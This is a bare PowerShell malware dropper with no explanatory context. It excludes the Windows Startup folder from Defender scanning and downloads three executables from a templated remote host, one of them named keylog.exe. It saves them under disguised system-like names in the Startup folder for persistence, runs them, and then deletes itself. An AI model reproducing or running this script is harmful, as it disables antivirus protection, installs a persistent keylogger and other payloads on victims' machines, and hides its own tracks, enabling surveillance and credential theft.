$path = [Environment]::GetFolderPath('CommonStartup')
set-mppreference -exclusionpath $path
cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
Invoke-WebRequest -Uri 'http://[ip]:[port]/[token]/windows.exe' -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\windows.exe"
.\windows.exe
Invoke-WebRequest -Uri 'http://[ip]:[port]/[token]/keylog.exe' -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Windows-System.exe"
.\Windows-System.exe
Invoke-WebRequest -Uri 'http://[ip]:[port]/[token]/reach.exe' -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Windows-Process.exe"
.\Windows-Process.exe

Remove-Item -Path $MyInvocation.MyCommand.Source
